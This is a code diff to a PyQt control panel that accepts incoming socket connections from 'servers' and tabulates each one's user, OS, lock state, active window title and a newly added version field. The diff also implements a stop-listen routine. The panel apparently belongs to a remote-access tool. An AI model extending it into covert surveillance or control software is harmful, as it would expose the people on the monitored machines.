@@ -43,13 +43,15 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
         self.index_of_lock = 2
         self.index_of_os = 3
         self.index_of_user = 4
-        self.index_of_activeWindowTitle = 5
+        self.index_of_version = 5
+        self.index_of_activeWindowTitle = 6
         # initialize servers table columns width
         self.serversTable.setColumnWidth(self.index_of_ipAddress, 150)
         self.serversTable.setColumnWidth(self.index_of_socket, 60)
         self.serversTable.setColumnWidth(self.index_of_lock, 90)
         self.serversTable.setColumnWidth(self.index_of_os, 200)
-        self.serversTable.setColumnWidth(self.index_of_user, 150)
+        self.serversTable.setColumnWidth(self.index_of_user, 100)
+        self.serversTable.setColumnWidth(self.index_of_version, 120)
         # servers table double click trigger
         self.serversTable.doubleClicked.connect(self.unlockServer)
         # Initializing explorer right click menu
@@ -58,6 +60,7 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
 
         # Triggers
         self.startListenButton.clicked.connect(self.startListen)
+        self.stopListenButton.clicked.connect(self.stopListen)
 
 
     # Start Listen for Servers
@@ -70,13 +73,14 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
         self.listenthread.start()
         self.statusLabel.setText('Listening')
         self.statusLabel.setStyleSheet('color: lime; padding: 5px;')
+        self.startListenButton.setChecked(True)
+        self.stopListenButton.setChecked(False)
 
 
     # listen for clients
     # accept connections
     # add to socketlist widget
     def listenConnections(self, port):
-
         # Initializing socket
         self.c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # telling the OS that you know what you're doing and you still want to bind to the same port
@@ -93,7 +97,6 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
                 # Try accept connection
                 self.sock, self.address = self.c.accept()
             except:
-
                 continue
 
             if not self.acceptthreadState:
@@ -120,6 +123,7 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
                     self.socks[socketIndex]['protection'] = info['protection']
                     self.socks[socketIndex]['os'] = info['os']
                     self.socks[socketIndex]['user'] = info['user']
+                    self.socks[socketIndex]['version'] = info['version']
                     self.socks[socketIndex]['activewindowtitle'] = info['activewindowtitle']
 
                     self.updateServersTable()
@@ -143,6 +147,7 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
                     info = ast.literal_eval(data)
                     self.socks[i]['protection'] = info['protection']
                     self.socks[i]['user'] = info['user']
+                    self.socks[i]['version'] = info['version']
                     self.socks[i]['activewindowtitle'] = info['activewindowtitle']
                 except socket.error:
                     del self.socks[i]
@@ -185,6 +190,11 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
             # add server user
             item = QTableWidgetItem(self.socks[obj]['user'])
             self.serversTable.setItem(index, self.index_of_user, item)
+
+            # add servers version
+            item = QTableWidgetItem(self.socks[obj]['version'])
+            item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
+            self.serversTable.setItem(index, self.index_of_version, item)
 
             # add active windows title
             item = QTableWidgetItem(self.socks[obj]['activewindowtitle'])
@@ -240,7 +250,18 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
 
     # Stop Listen for Servers
     def stopListen(self):
-        pass
+        self.acceptthreadState = False
+        self.serversTable.clearContents()
+        self.startListenButton.setChecked(False)
+        self.stopListenButton.setChecked(True)
+        self.statusLabel.setText('Not Listening')
+        self.statusLabel.setStyleSheet('color: #e74c3c; padding: 5px;')
+        try:
+            self.shd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.shd.connect(('127.0.0.1', 4434))
+            self.shd.close()
+        except:
+            pass
 
     def serversMenu(self, point):
         self.eMenu = QMenu(self)
